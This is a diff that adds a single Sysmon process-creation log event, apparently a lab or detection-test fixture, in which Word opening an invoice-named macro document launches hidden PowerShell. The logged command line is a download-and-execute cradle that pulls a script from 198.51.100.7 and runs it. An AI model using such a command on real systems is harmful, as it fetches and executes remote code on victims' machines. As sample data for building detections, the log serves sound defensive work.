@@ -1,0 +1,12 @@
+{
+  "EventID": 1,
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "Computer": "WIN-LAB01",
+  "UtcTime": "2026-10-21 14:03:11.512",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+  "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\analyst\\Downloads\\Invoice_88213.docm\"",
+  "User": "LAB\\analyst",
+  "IntegrityLevel": "Medium"
+}
